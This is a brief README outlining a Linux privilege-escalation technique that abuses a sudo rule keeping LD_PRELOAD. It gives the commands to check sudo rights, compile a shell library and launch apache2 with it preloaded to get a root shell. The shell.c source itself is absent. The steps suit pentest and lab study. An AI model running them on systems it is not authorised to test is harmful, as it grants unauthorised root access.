# LD_Preload_PrivEsc
LD_Preload PrivEsc found on @johnjhacking blog (https://johnjhacking.com)

#### Check for env_keep+=LD_PRELOAD
sudo -l or linpeas.sh

#### Compile the shell.c code
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

#### Add shell.so to LD_PRELOAD
sudo LD_PRELOAD=~/shell.so apache2
